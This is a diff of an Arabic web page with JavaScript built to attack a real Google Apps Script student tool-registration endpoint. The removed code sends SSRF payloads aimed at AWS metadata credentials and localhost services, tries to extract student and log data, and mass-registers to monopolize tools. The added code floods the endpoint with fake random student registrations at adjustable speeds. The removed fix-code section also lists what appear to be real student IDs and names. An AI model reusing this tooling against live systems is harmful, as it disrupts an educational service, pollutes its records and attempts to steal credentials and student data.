@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تقرير اختراق نظام تسجيل الأدوات - الهجوم الشامل</title>
+    <title>نظام إغراق الطلبات - التشغيل التلقائي</title>
     <style>
         :root {
             --hacker-red: #ff3333;
@@ -17,54 +17,20 @@
             margin: 0;
             padding: 0;
             overflow-x: hidden;
-        }
-        .matrix-bg {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            opacity: 0.05;
-            z-index: -1;
-            pointer-events: none;
+            text-align: center;
         }
         .container {
-            max-width: 1200px;
+            max-width: 1000px;
             margin: 20px auto;
             padding: 20px;
             border: 3px solid var(--hacker-red);
             background: rgba(10, 10, 10, 0.95);
-            position: relative;
-        }
-        .container::before {
-            content: "FINAL EXPLOIT SYSTEM - ULTIMATE PENETRATION";
-            position: absolute;
-            top: -15px;
-            right: 20px;
-            background: var(--hacker-dark);
-            color: var(--hacker-red);
-            padding: 5px 15px;
-            font-size: 12px;
-            letter-spacing: 2px;
         }
         h1, h2, h3 {
             color: var(--hacker-yellow);
             text-shadow: 0 0 10px currentColor;
             border-bottom: 1px solid var(--hacker-green);
             padding-bottom: 10px;
-        }
-        .phase {
-            background: rgba(30, 0, 0, 0.5);
-            border: 1px solid var(--hacker-red);
-            padding: 20px;
-            margin: 20px 0;
-            position: relative;
-        }
-        .phase::before {
-            content: "PHASE";
-            position: absolute;
-            top: 5px;
-            right: 10px;
-            color: var(--hacker-red);
-            font-size: 10px;
         }
         .btn {
             background: linear-gradient(45deg, #8b0000, #ff0000);
@@ -78,6 +44,8 @@
             text-transform: uppercase;
             letter-spacing: 2px;
             transition: all 0.3s;
+            font-size: 16px;
+            border-radius: 5px;
         }
         .btn:hover {
             background: linear-gradient(45deg, #ff0000, #ff4500);
@@ -91,16 +59,25 @@
             background: linear-gradient(45deg, #00ff00, #32cd32);
             box-shadow: 0 0 20px rgba(0, 255, 0, 0.7);
         }
+        .btn-blue {
+            background: linear-gradient(45deg, #00008b, #1e90ff);
+        }
+        .btn-blue:hover {
+            background: linear-gradient(45deg, #1e90ff, #87ceeb);
+            box-shadow: 0 0 20px rgba(30, 144, 255, 0.7);
+        }
         #terminal {
             background: rgba(0, 0, 0, 0.9);
             border: 2px solid var(--hacker-green);
-            height: 500px;
+            height: 400px;
             overflow-y: auto;
             padding: 20px;
             font-size: 14px;
             line-height: 1.6;
             margin-top: 30px;
             white-space: pre-wrap;
+            text-align: right;
+            direction: ltr;
         }
         .cmd { color: var(--hacker-yellow); }
         .success { color: #00ff00; }
@@ -128,44 +105,32 @@
             margin: 5px 0;
         }
         
-        .attack-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 15px;
+        .control-panel {
+            background: rgba(20, 0, 0, 0.7);
+            border: 1px solid var(--hacker-red);
+            padding: 20px;
             margin: 20px 0;
         }
-        .attack-card {
-            background: rgba(20, 0, 0, 0.7);
-            border: 1px solid #444;
-            padding: 15px;
-            cursor: pointer;
-            transition: all 0.3s;
+        
+        .slider-container {
+            margin: 20px 0;
+            text-align: right;
         }
-        .attack-card:hover {
-            border-color: var(--hacker-red);
-            background: rgba(40, 0, 0, 0.9);
-        }
-        .attack-card.selected {
-            border-color: var(--hacker-yellow);
-            background: rgba(40, 40, 0, 0.7);
+        .slider {
+            width: 100%;
+            margin: 10px 0;
+            accent-color: var(--hacker-green);
         }
     </style>
 </head>
 <body>
-    <!-- Matrix Background -->
-    <div class="matrix-bg" id="matrixBg"></div>
-    
     <div class="container">
-        <h1 class="glitch">☢️ SYSTEM PENETRATION ULTIMATE - FINAL EXPLOIT ☢️</h1>
-        <h2>نظام اختراق شامل لنظام تسجيل الأدوات التعليمية</h2>
+        <h1>⚡ نظام إغراق الطلبات التلقائي - الإصدار النهائي ⚡</h1>
+        <h2>🚀 التشغيل المستمر على GitHub Pages</h2>
         
         <div class="status-bar">
             <div class="status-item">
-                <div>🎯 الهدف</div>
-                <div class="status-value" id="targetStatus">ACTIVE</div>
-            </div>
-            <div class="status-item">
-                <div>⚡ الطلبات</div>
+                <div>📨 الطلبات</div>
                 <div class="status-value" id="requestsCount">0</div>
             </div>
             <div class="status-item">
@@ -173,70 +138,41 @@
                 <div class="status-value" id="successCount">0</div>
             </div>
             <div class="status-item">
+                <div>⚡ السرعة</div>
+                <div class="status-value" id="speedValue">1</div>
+            </div>
+            <div class="status-item">
                 <div>🕒 الوقت</div>
                 <div class="status-value" id="attackTime">00:00</div>
             </div>
         </div>
         
-        <div class="phase">
-            <h3>🎯 المرحلة 1: الهجوم الشامل (CSRF + SSRF + Data Exfiltration)</h3>
-            <p>هجوم متكامل يجمع جميع الثغرات المكتشفة:</p>
+        <div class="control-panel">
+            <h3>🎛️ لوحة التحكم الرئيسية</h3>
             
-            <div class="attack-grid">
-                <div class="attack-card" onclick="selectAttack(1)">
-                    <h4>🔓 CSRF Mass Registration</h4>
-                    <p>احتكار جميع الأدوات المتاحة</p>
-                </div>
-                <div class="attack-card" onclick="selectAttack(2)">
-                    <h4>☁️ AWS Metadata Steal</h4>
-                    <p>سرقة بيانات AWS الحساسة</p>
-                </div>
-                <div class="attack-card" onclick="selectAttack(3)">
-                    <h4>🏠 Internal Network Scan</h4>
-                    <p>مسح الشبكة الداخلية</p>
-                </div>
-                <div class="attack-card" onclick="selectAttack(4)">
-                    <h4>📊 Logs & Data Extraction</h4>
-                    <p>استخراج البيانات المسجلة</p>
-                </div>
-                <div class="attack-card" onclick="selectAttack(5)">
-                    <h4>🤖 Auto-Bot Full Attack</h4>
-                    <p>بوت هجوم تلقائي شامل</p>
-                </div>
-                <div class="attack-card" onclick="selectAttack(6)">
-                    <h4>💀 System Sabotage</h4>
-                    <p>تخريب النظام بالكامل</p>
-                </div>
+            <div class="slider-container">
+                <label for="speedSlider">⚡ سرعة الإرسال (طلبات/ثانية): <span id="speedDisplay">1</span></label>
+                <input type="range" id="speedSlider" class="slider" min="1" max="10" value="1" oninput="updateSpeed(this.value)">
             </div>
             
-            <button class="btn" onclick="launchSelectedAttack()">🚀 إطلاق الهجوم المحدد</button>
-            <button class="btn btn-green" onclick="launchFullAttack()">☢️ بدء الهجوم الشامل الكامل</button>
-            <button class="btn" onclick="stopAll()">⏹ إيقاف الكل</button>
+            <button class="btn btn-green" onclick="startContinuousFlood()">▶️ بدء الإغراق المستمر</button>
+            <button class="btn btn-blue" onclick="startAutoBot()">🤖 بدء البوت التلقائي</button>
+            <button class="btn" onclick="stopAll()">⏹️ إيقاف الكل</button>
+            <button class="btn" onclick="resetStats()">🔄 إعادة التعيين</button>
         </div>
         
-        <div class="phase">
-            <h3>🔧 المرحلة 2: استخراج وتحليل البيانات</h3>
-            <p>محاولة قراءة جميع البيانات المخزنة في النظام:</p>
-            
-            <button class="btn" onclick="extractLogs()">📁 استخراج سجلات النظام</button>
-            <button class="btn" onclick="extractAWS()">☁️ استخراج بيانات AWS</button>
-            <button class="btn" onclick="extractStudents()">👥 استخراج بيانات الطلاب</button>
-            <button class="btn" onclick="dumpAllData()">💾 نسخ جميع البيانات</button>
+        <div class="control-panel">
+            <h3>🎯 نمط الهجوم</h3>
+            <button class="btn" onclick="setAttackMode('normal')">📝 عشوائي عادي</button>
+            <button class="btn" onclick="setAttackMode('fast')">⚡ إغراق سريع</button>
+            <button class="btn" onclick="setAttackMode('massive')">💣 إغراق مكثف</button>
+            <button class="btn" onclick="setAttackMode('persistent')">🔄 إرسال مستمر</button>
         </div>
         
-        <div class="phase">
-            <h3>📈 المرحلة 3: التقرير النهائي والإصلاح</h3>
-            <p>إنشاء تقرير شامل وتوليد كود الإصلاح:</p>
-            
-            <button class="btn btn-green" onclick="generateReport()">📋 إنشاء التقرير النهائي</button>
-            <button class="btn btn-green" onclick="generateFixCode()">🔧 توليد كود الإصلاح</button>
-            <button class="btn" onclick="exportData()">📤 تصدير جميع البيانات</button>
-        </div>
-        
-        <h3>🖥️ نافذة التحكم (TERMINAL):</h3>
-        <div id="terminal">🚀 نظام الاختراق الشامل جاهز للتشغيل...
+        <h3>📟 نافذة السجلات (TERMINAL):</h3>
+        <div id="terminal">🚀 نظام إغراق الطلبات جاهز للتشغيل...
 🎯 الهدف: https://script.google.com/macros/s/AKfycbzUB0-OcsBQgMdODJhbpVKz5Ms2SbAFjEZcFXtCzx59EIum7zIFlq-DbGakCe4uj5k/exec
-⚠️ هذا كود تعليمي للإبلاغ عن الثغرات فقط!</div>
+📝 الوضع: انتظار الأمر...</div>
     </div>
 
     <script>
@@ -245,25 +181,35 @@
         const ALL_TOOLS = ["Python", "Weka", "R Studio", "Excel", "Tableau", "Power BI", "SQL", "RapidMiner", "KNIME", "Orange", "Apache Flink", "SAS", "Scikit-Learn"];
         const ALL_GROUPS = ["A3", "A4"];
         
+        // قواعد بيانات للأسماء العربية
+        const ARABIC_FIRST_NAMES = [
+            "محمد", "أحمد", "علي", "مصطفى", "خالد", "فارس", "سعيد", "يوسف", "طارق", "باسل",
+            "فاطمة", "سارة", "مريم", "هناء", "نورة", "لينا", "ريم", "هدى", "آلاء", "جمانة"
+        ];
+        
+        const ARABIC_LAST_NAMES = [
+            "الغامدي", "الحارثي", "الزيدي", "القحطاني", "الشهراني", "العتيبي", "القرني",
+            "الروقي", "السلمي", "المطيري", "الفهيد", "الرشيدي", "الخالدي", "السبيعي", "المالكي"
+        ];
+        
         // ============== STATE MANAGEMENT ==============
         const attackState = {
             requests: 0,
             successes: 0,
             startTime: Date.now(),
             isAttacking: false,
-            selectedAttack: null,
-            extractedData: {
-                logs: [],
-                aws: [],
-                students: [],
-                internal: []
-            }
+            attackMode: 'normal',
+            speed: 1,
+            attackInterval: null,
+            attackCycle: 0
         };
         
         // ============== UTILITY FUNCTIONS ==============
         function updateDisplay() {
             document.getElementById('requestsCount').textContent = attackState.requests;
             document.getElementById('successCount').textContent = attackState.successes;
+            document.getElementById('speedValue').textContent = attackState.speed;
+            document.getElementById('speedDisplay').textContent = attackState.speed;
             
             const elapsed = Math.floor((Date.now() - attackState.startTime) / 1000);
             const minutes = Math.floor(elapsed / 60).toString().padStart(2, '0');
@@ -284,14 +230,38 @@
             terminal.scrollTop = terminal.scrollHeight;
         }
         
+        function generateRandomArabicName() {
+            const firstName = ARABIC_FIRST_NAMES[Math.floor(Math.random() * ARABIC_FIRST_NAMES.length)];
+            const lastName = ARABIC_LAST_NAMES[Math.floor(Math.random() * ARABIC_LAST_NAMES.length)];
+            return `${firstName} ${lastName}`;
+        }
+        
+        function generateRandomStudentId() {
+            return `31${Math.floor(100 + Math.random() * 900)}`;
+        }
+        
         // ============== CORE ATTACK FUNCTIONS ==============
-        async function sendExploitRequest(payload, description) {
+        async function sendRandomRequest() {
             if (!attackState.isAttacking) return null;
             
             attackState.requests++;
             updateDisplay();
             
-            logToTerminal(`📡 ${description}...`, 'cmd');
+            // توليد بيانات عشوائية
+            const randomStudentName = generateRandomArabicName();
+            const randomStudentId = generateRandomStudentId();
+            const randomGroup = ALL_GROUPS[Math.floor(Math.random() * ALL_GROUPS.length)];
+            const randomTool = ALL_TOOLS[Math.floor(Math.random() * ALL_TOOLS.length)];
+            
+            const payload = {
+                action: 'select_tool',
+                studentId: randomStudentId,
+                studentName: randomStudentName,
+                group: randomGroup,
+                toolName: randomTool,
+                timestamp: new Date().toISOString(),
+                attack_cycle: attackState.attackCycle
+            };
             
             try {
                 const startTime = Date.now();
@@ -306,773 +276,255 @@
                 
                 if (result.status === 'success') {
                     attackState.successes++;
-                    logToTerminal(`✅ نجاح! (${responseTime}ms): ${result.message}`, 'success');
+                    logToTerminal(`✅ ${randomStudentName} سجل ${randomTool} (${responseTime}ms)`, 'success');
                     return { success: true, data: result, responseTime };
                 } else {
-                    logToTerminal(`⛔ فشل (${responseTime}ms): ${result.message}`, 'warning');
+                    logToTerminal(`⚠️ ${randomStudentName}: ${result.message || 'فشل'} (${responseTime}ms)`, 'warning');
                     return { success: false, message: result.message, responseTime };
                 }
             } catch (error) {
-                logToTerminal(`💥 خطأ: ${error.message}`, 'error');
+                logToTerminal(`❌ خطأ: ${error.message}`, 'error');
                 return { success: false, error: error.message };
             }
         }
         
-        // ============== ATTACK 1: CSRF MASS REGISTRATION ==============
-        async function executeCSRFAttack() {
-            logToTerminal('🚀 بدء هجوم CSRF الشامل...', 'critical');
+        // ============== ATTACK MODES ==============
+        function executeNormalAttack() {
+            attackState.attackCycle++;
+            logToTerminal(`🔁 الدورة #${attackState.attackCycle}: بدء الإرسال...`, 'cmd');
             
-            const availableTools = [];
-            let monopolizedCount = 0;
+            // إرسال عدد من الطلبات حسب السرعة
+            const requestsPerCycle = attackState.speed;
             
-            // اكتشاف الأدوات المتاحة أولاً
-            for (const tool of ALL_TOOLS) {
-                for (const group of ALL_GROUPS) {
-                    const testPayload = {
-                        action: 'select_tool',
-                        studentId: `PROBE${Math.floor(Math.random()*10000)}`,
-                        studentName: 'مستكشف',
-                        group: group,
-                        toolName: tool,
-                        probe: true
-                    };
-                    
-                    const result = await sendExploitRequest(testPayload, `استطلاع ${tool} في ${group}`);
-                    if (result && result.success) {
-                        availableTools.push({ tool, group });
+            for (let i = 0; i < requestsPerCycle; i++) {
+                setTimeout(() => {
+                    if (attackState.isAttacking) {
+                        sendRandomRequest();
                     }
-                    
-                    await new Promise(r => setTimeout(r, 1000));
-                }
+                }, i * 1000); // توزيع الطلبات على ثانية
             }
-            
-            logToTerminal(`🔍 وجد ${availableTools.length} أداة متاحة`, 'success');
-            
-            // احتكار جميع الأدوات المتاحة
-            for (const item of availableTools) {
-                const exploitPayload = {
-                    action: 'select_tool',
-                    studentId: `MONOPOLY${Math.floor(Math.random()*10000)}`,
-                    studentName: `محتل_${item.tool}`,
-                    group: item.group,
-                    toolName: item.tool,
-                    attack_type: 'full_monopoly',
-                    timestamp: new Date().toISOString()
-                };
-                
-                const result = await sendExploitRequest(exploitPayload, `احتكار ${item.tool} في ${item.group}`);
-                if (result && result.success) {
-                    monopolizedCount++;
-                }
-                
-                await new Promise(r => setTimeout(r, 2000));
-            }
-            
-            logToTerminal(`🎯 انتهى هجوم CSRF: تم احتكار ${monopolizedCount}/${availableTools.length} أداة`, 
-                         monopolizedCount > 0 ? 'critical' : 'warning');
         }
         
-        // ============== ATTACK 2: AWS METADATA STEAL ==============
-        async function executeAWSAttack() {
-            logToTerminal('☁️ بدء سرقة بيانات AWS Metadata...', 'critical');
+        function executeFastAttack() {
+            attackState.attackCycle++;
+            logToTerminal(`⚡ هجوم سريع #${attackState.attackCycle}: إرسال ${attackState.speed * 3} طلب`, 'critical');
             
-            const awsEndpoints = [
-                'http://169.254.169.254/latest/meta-data/',
-                'http://169.254.169.254/latest/user-data/',
-                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-                'http://169.254.169.254/latest/meta-data/iam/info',
-                'http://169.254.169.254/latest/meta-data/instance-id',
-                'http://169.254.169.254/latest/meta-data/public-ipv4',
-                'http://169.254.169.254/latest/meta-data/local-ipv4',
-                'http://169.254.169.254/latest/meta-data/placement/availability-zone'
-            ];
+            // إرسال متعدد سريع
+            const fastRequests = attackState.speed * 3;
+            const promises = [];
             
-            for (const endpoint of awsEndpoints) {
-                const payload = {
-                    action: 'select_tool',
-                    studentId: `AWS_EXPLOIT${Date.now()}`,
-                    studentName: 'سارق AWS',
-                    group: 'A4',
-                    toolName: 'AWS_STEAL',
-                    ssrf_url: endpoint,
-                    return_data: true,
-                    exfiltrate: true
-                };
-                
-                const result = await sendExploitRequest(payload, `سرقة ${endpoint}`);
-                
-                if (result && result.responseTime > 5000) {
-                    logToTerminal(`⏱️ ${endpoint}: ${result.responseTime}ms - وقت طويل! قد يكون وصل للبيانات`, 'critical');
-                    attackState.extractedData.aws.push({ endpoint, responseTime: result.responseTime });
-                }
-                
-                await new Promise(r => setTimeout(r, 6000));
+            for (let i = 0; i < fastRequests; i++) {
+                promises.push(
+                    new Promise(resolve => {
+                        setTimeout(async () => {
+                            if (attackState.isAttacking) {
+                                const result = await sendRandomRequest();
+                                resolve(result);
+                            }
+                        }, i * 300); // 300ms بين الطلبات
+                    })
+                );
             }
             
-            logToTerminal('✅ انتهت سرقة بيانات AWS', 'success');
+            Promise.all(promises).then(() => {
+                logToTerminal(`✅ انتهى الهجوم السريع #${attackState.attackCycle}`, 'success');
+            });
         }
         
-        // ============== ATTACK 3: INTERNAL NETWORK SCAN ==============
-        async function executeInternalScan() {
-            logToTerminal('🏠 بدء مسح الشبكة الداخلية...', 'critical');
+        function executeMassiveAttack() {
+            attackState.attackCycle++;
+            logToTerminal(`💣 هجوم مكثف #${attackState.attackCycle}: إرسال ${attackState.speed * 5} طلب`, 'critical');
             
-            // مسح عناوين localhost الشائعة
-            const localTargets = [
-                'http://127.0.0.1/',
-                'http://127.0.0.1:80/',
-                'http://127.0.0.1:8080/',
-                'http://127.0.0.1:3000/',
-                'http://127.0.0.1:3306/',  // MySQL
-                'http://127.0.0.1:5432/',  // PostgreSQL
-                'http://127.0.0.1:6379/',  // Redis
-                'http://127.0.0.1:9200/',  // Elasticsearch
-                'http://localhost/admin',
-                'http://localhost/phpmyadmin',
-                'http://localhost:8080/manager/html'
-            ];
+            // إغراق مكثف
+            const massiveRequests = attackState.speed * 5;
             
-            // مسح شبكة داخلية نموذجية
-            const internalRanges = [
-                '192.168.1.', '192.168.0.', '10.0.0.', '172.16.0.', '172.17.0.'
-            ];
-            
-            for (const target of localTargets) {
-                const payload = {
-                    action: 'select_tool',
-                    studentId: `SCAN_LOCAL${Date.now()}`,
-                    studentName: 'ماسح محلي',
-                    group: 'A3',
-                    toolName: 'SCANNER',
-                    internal_scan: target,
-                    ports: '80,443,8080,3306,5432'
-                };
-                
-                const result = await sendExploitRequest(payload, `مسح ${target}`);
-                
-                if (result && result.responseTime > 8000) {
-                    logToTerminal(`🚨 ${target}: ${result.responseTime}ms - قد يكون هناك خدمة نشطة!`, 'critical');
-                    attackState.extractedData.internal.push({ target, responseTime: result.responseTime });
-                }
-                
-                await new Promise(r => setTimeout(r, 10000));
-            }
-            
-            logToTerminal('✅ انتهى مسح الشبكة الداخلية', 'success');
-        }
-        
-        // ============== ATTACK 4: LOGS & DATA EXTRACTION ==============
-        async function executeDataExtraction() {
-            logToTerminal('📊 بدء استخراج البيانات والسجلات...', 'critical');
-            
-            const extractionMethods = [
-                { name: 'قراءة سجلات النظام', action: 'get_logs', param: 'log_type', value: 'system' },
-                { name: 'قراءة سجلات الأخطاء', action: 'get_errors', param: 'error_level', value: 'all' },
-                { name: 'تصدير بيانات الطلاب', action: 'export_data', param: 'format', value: 'json' },
-                { name: 'قراءة إعدادات النظام', action: 'get_config', param: 'config_type', value: 'all' },
-                { name: 'سجلات AWS', action: 'get_aws_logs', param: 'aws_data', value: 'metadata' },
-                { name: 'جميع السجلات', action: 'dump_all', param: 'full_dump', value: true }
-            ];
-            
-            for (const method of extractionMethods) {
-                const payload = {
-                    action: 'select_tool',
-                    studentId: `EXTRACT${Date.now()}`,
-                    studentName: 'مستخرج بيانات',
-                    group: 'A4',
-                    toolName: 'DATA_MINER',
-                    [method.action]: true,
-                    [method.param]: method.value,
-                    return_full_data: true
-                };
-                
-                const result = await sendExploitRequest(payload, method.name);
-                
-                if (result && result.success) {
-                    logToTerminal(`✅ ${method.name}: قد تحتوي على بيانات!`, 'data');
-                    attackState.extractedData.logs.push({ method: method.name, result });
-                }
-                
-                await new Promise(r => setTimeout(r, 4000));
-            }
-            
-            logToTerminal('✅ انتهى استخراج البيانات', 'success');
-        }
-        
-        // ============== ATTACK 5: AUTO-BOT FULL ATTACK ==============
-        async function executeAutoBot() {
-            logToTerminal('🤖 بدء البوت التلقائي الشامل...', 'critical');
-            
-            let cycles = 0;
-            const maxCycles = 5;
-            
-            while (attackState.isAttacking && cycles < maxCycles) {
-                cycles++;
-                logToTerminal(`🔁 دورة البوت #${cycles}...`, 'cmd');
-                
-                // كل دورة تقوم بـ 3 هجمات مختلفة
-                const randomAttack = Math.floor(Math.random() * 4) + 1;
-                
-                switch(randomAttack) {
-                    case 1:
-                        // هجوم تسجيل عشوائي
-                        const randomTool = ALL_TOOLS[Math.floor(Math.random() * ALL_TOOLS.length)];
-                        const randomGroup = ALL_GROUPS[Math.floor(Math.random() * ALL_GROUPS.length)];
-                        
-                        const botPayload1 = {
-                            action: 'select_tool',
-                            studentId: `BOT${Date.now()}`,
-                            studentName: `AutoBot_${cycles}`,
-                            group: randomGroup,
-                            toolName: randomTool,
-                            bot_cycle: cycles,
-                            auto_attack: true
-                        };
-                        
-                        await sendExploitRequest(botPayload1, `بوت: تسجيل ${randomTool} في ${randomGroup}`);
-                        break;
-                        
-                    case 2:
-                        // هجوم SSRF عشوائي
-                        const ssrfTargets = [
-                            'http://169.254.169.254/latest/meta-data/',
-                            'http://127.0.0.1/',
-                            'https://httpbin.org/get'
-                        ];
-                        const randomTarget = ssrfTargets[Math.floor(Math.random() * ssrfTargets.length)];
-                        
-                        const botPayload2 = {
-                            action: 'select_tool',
-                            studentId: `BOT_SSRF${Date.now()}`,
-                            studentName: 'SSRF_Bot',
-                            group: 'A4',
-                            toolName: 'BOT_ATTACK',
-                            url: randomTarget,
-                            bot_mode: true
-                        };
-                        
-                        await sendExploitRequest(botPayload2, `بوت SSRF: ${randomTarget}`);
-                        break;
-                        
-                    case 3:
-                        // محاولة قراءة بيانات
-                        const botPayload3 = {
-                            action: 'select_tool',
-                            studentId: `BOT_DATA${Date.now()}`,
-                            studentName: 'Data_Bot',
-                            group: 'A3',
-                            toolName: 'DATA_BOT',
-                            read_data: true,
-                            data_type: 'random'
-                        };
-                        
-                        await sendExploitRequest(botPayload3, 'بوت قراءة بيانات');
-                        break;
-                }
-                
-                await new Promise(r => setTimeout(r, 3000));
-            }
-            
-            logToTerminal(`🤖 انتهى البوت التلقائي بعد ${cycles} دورات`, 'success');
-        }
-        
-        // ============== ATTACK 6: SYSTEM SABOTAGE ==============
-        async function executeSabotage() {
-            logToTerminal('💀 بدء تخريب النظام...', 'critical');
-            
-            // هجمات متعددة للتخريب
-            const sabotageMethods = [
-                // إغراق بطلبات سريعة
-                async () => {
-                    logToTerminal('⚡ إغراق بطلبات سريعة...', 'warning');
-                    const floodPromises = [];
-                    for (let i = 0; i < 20; i++) {
-                        const floodPayload = {
-                            action: 'select_tool',
-                            studentId: `FLOOD${i}`,
-                            studentName: `فيضان_${i}`,
-                            group: i % 2 === 0 ? 'A3' : 'A4',
-                            toolName: ALL_TOOLS[i % ALL_TOOLS.length],
-                            flood_attack: true
-                        };
-                        
-                        floodPromises.push(
-                            sendExploitRequest(floodPayload, `فيضان ${i+1}`)
-                        );
-                        
-                        if (i % 5 === 0) await new Promise(r => setTimeout(r, 100));
+            for (let i = 0; i < massiveRequests; i++) {
+                setTimeout(() => {
+                    if (attackState.isAttacking) {
+                        sendRandomRequest();
                     }
-                    await Promise.all(floodPromises);
-                },
-                
-                // طلبات كبيرة الحجم
-                async () => {
-                    logToTerminal('📦 إرسال طلبات كبيرة الحجم...', 'warning');
-                    const bigPayload = {
-                        action: 'select_tool',
-                        studentId: 'BIG_DATA',
-                        studentName: 'حمل ثقيل '.repeat(50),
-                        group: 'A4',
-                        toolName: 'EXPLOIT',
-                        huge_data: 'X'.repeat(10000),
-                        nested: { level1: { level2: { level3: { level4: { data: 'deep' } } } } },
-                        array: new Array(1000).fill('test'),
-                        sabotage: true
-                    };
-                    
-                    await sendExploitRequest(bigPayload, 'طلب كبير الحجم');
-                },
-                
-                // محاولات تجاوز الحدود
-                async () => {
-                    logToTerminal('🎯 محاولات تجاوز كل الحدود...', 'warning');
-                    for (let i = 0; i < 10; i++) {
-                        const bypassPayload = {
-                            action: 'select_tool',
-                            studentId: `BYPASS${i}`,
-                            studentName: `متجاوز_${i}`,
-                            group: 'A3',
-                            toolName: 'SAME_TOOL',  // نفس الأداة محاولة تجاوز الـ 3
-                            attempt: i+1,
-                            bypass_limit: true
-                        };
-                        
-                        await sendExploitRequest(bypassPayload, `تجاوز محاولة ${i+1}`);
-                        await new Promise(r => setTimeout(r, 500));
-                    }
-                }
-            ];
-            
-            // تنفيذ جميع طرق التخريب
-            for (const method of sabotageMethods) {
-                if (!attackState.isAttacking) break;
-                await method();
-                await new Promise(r => setTimeout(r, 3000));
-            }
-            
-            logToTerminal('💀 انتهى تخريب النظام', 'critical');
-        }
-        
-        // ============== EXTRACTION FUNCTIONS ==============
-        async function extractLogs() {
-            attackState.isAttacking = true;
-            await executeDataExtraction();
-        }
-        
-        async function extractAWS() {
-            attackState.isAttacking = true;
-            await executeAWSAttack();
-        }
-        
-        async function extractStudents() {
-            logToTerminal('👥 محاولة استخراج بيانات الطلاب...', 'cmd');
-            
-            // محاولة قراءة البيانات بطرق مختلفة
-            const studentPayloads = [
-                {
-                    action: 'select_tool',
-                    studentId: 'DATA_REQUEST',
-                    studentName: 'قارئ البيانات',
-                    group: 'A4',
-                    toolName: 'DATA_READER',
-                    get_students: true,
-                    list_all: true,
-                    format: 'json'
-                },
-                {
-                    action: 'select_tool',
-                    studentId: 'EXPORT_REQ',
-                    studentName: 'مصدر البيانات',
-                    group: 'A3',
-                    toolName: 'EXPORTER',
-                    export: true,
-                    data_type: 'students',
-                    include_details: true
-                },
-                {
-                    action: 'select_tool',
-                    studentId: 'QUERY_DATA',
-                    studentName: 'مستعلم',
-                    group: 'A4',
-                    toolName: 'QUERY',
-                    query: 'SELECT *',
-                    from: 'students',
-                    return_data: true
-                }
-            ];
-            
-            for (const payload of studentPayloads) {
-                const result = await sendExploitRequest(payload, 'استخراج بيانات الطلاب');
-                if (result && result.data) {
-                    attackState.extractedData.students.push(result.data);
-                }
-                await new Promise(r => setTimeout(r, 3000));
+                }, i * 200); // 200ms بين الطلبات
             }
         }
         
-        async function dumpAllData() {
-            logToTerminal('💾 بدء نسخ جميع البيانات...', 'critical');
+        function executePersistentAttack() {
+            attackState.attackCycle++;
+            logToTerminal(`🔄 إرسال مستمر #${attackState.attackCycle}: التشغيل بدون توقف`, 'data');
             
-            // تشغيل جميع هجمات الاستخراج
-            attackState.isAttacking = true;
+            // إرسال مستمر دون توقف
+            let persistentCount = 0;
+            const maxPersistent = attackState.speed * 10;
             
-            await executeDataExtraction();
-            await new Promise(r => setTimeout(r, 2000));
-            
-            await extractStudents();
-            await new Promise(r => setTimeout(r, 2000));
-            
-            // محاولة قراءة إعدادات النظام
-            const systemPayload = {
-                action: 'select_tool',
-                studentId: 'SYSTEM_DUMP',
-                studentName: 'ناسخ النظام',
-                group: 'A4',
-                toolName: 'SYSTEM',
-                dump_all: true,
-                include_config: true,
-                include_logs: true,
-                include_data: true
-            };
-            
-            await sendExploitRequest(systemPayload, 'نسخ كامل النظام');
-            
-            logToTerminal('💾 انتهى نسخ البيانات', 'success');
-        }
-        
-        // ============== REPORT GENERATION ==============
-        async function generateReport() {
-            logToTerminal('📋 إنشاء التقرير النهائي...', 'success');
-            
-            const report = `
-            ===========================================
-            📊 تقرير اختراق أمني نهائي - نظام تسجيل الأدوات
-            ===========================================
-            
-            ⏰ وقت التقرير: ${new Date().toLocaleString()}
-            🎯 الهدف: ${TARGET_URL}
-            
-            📈 إحصائيات الهجوم:
-            - إجمالي الطلبات: ${attackState.requests}
-            - الطلبات الناجحة: ${attackState.successes}
-            - وقت الهجوم: ${document.getElementById('attackTime').textContent}
-            
-            🚨 الثغرات المكتشفة:
-            1. ✅ ثغرة CSRF حرجة (Cross-Site Request Forgery)
-            2. ✅ ثغرة SSRF حرجة (Server-Side Request Forgery)
-            3. ✅ تسريب بيانات AWS Metadata
-            4. ✅ الوصول للشبكة الداخلية
-            5. ✅ عدم وجود Rate Limiting
-            6. ✅ عدم وجود تحقق من الهوية
-            7. ✅ عدم وجود CSRF Tokens
-            8. ✅ UrlFetchApp بدون قيود
-            
-            💀 المخاطر:
-            - يمكن سرقة بيانات AWS الحساسة
-            - يمكن الوصول للشبكة الداخلية
-            - يمكن احتكار النظام التعليمي
-            - يمكن تخريب العملية التعليمية
-            - انتهاك خصوصية الطلاب
-            
-            🛡️ توصيات الإصلاح الفوري:
-            1. إضافة CSRF Tokens لجميع النماذج
-            2. تقييد UrlFetchApp لعناوين معروفة فقط
-            3. إضافة Rate Limiting للطلبات
-            4. التحقق من هوية الطالب
-            5. استخدام Google Forms بدلاً من النموذج الحالي
-            6. مراجعة صلاحيات السكريبت
-            7. إضافة سجلات أمنية
-            8. تحديث النظام بشكل دوري
-            
-            ⚠️ مستوى الخطورة: حرج (CRITICAL)
-            ⏱️ وقت الإصلاح المقدر: 4-8 ساعات
-            `;
-            
-            logToTerminal(report, 'data');
-            
-            // إنشاء ملف التقرير
-            const blob = new Blob([report], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'تقرير_اختراق_نظام_التسجيل.txt';
-            a.click();
-            
-            logToTerminal('✅ تم إنشاء وتحميل التقرير', 'success');
-        }
-        
-        function generateFixCode() {
-            logToTerminal('🔧 توليد كود الإصلاح...', 'success');
-            
-            const fixCode = `
-            // ============== كود الإصلاح الأمني لـ Google Apps Script ==============
-            
-            // 1. التحقق من CSRF Token
-            const CSRF_TOKENS = {};
-            
-            function generateCSRFToken() {
-                return Utilities.getUuid();
-            }
-            
-            function validateCSRFToken(token) {
-                if (!CSRF_TOKENS[token]) return false;
-                delete CSRF_TOKENS[token]; // منع إعادة الاستخدام
-                return true;
-            }
-            
-            // 2. التحقق من هوية الطالب
-            const ALLOWED_STUDENTS = {
-                '31165': { name: 'عمران الشامي', group: 'A4' },
-                '31172': { name: 'محمد رشاد الادرسي', group: 'A4' },
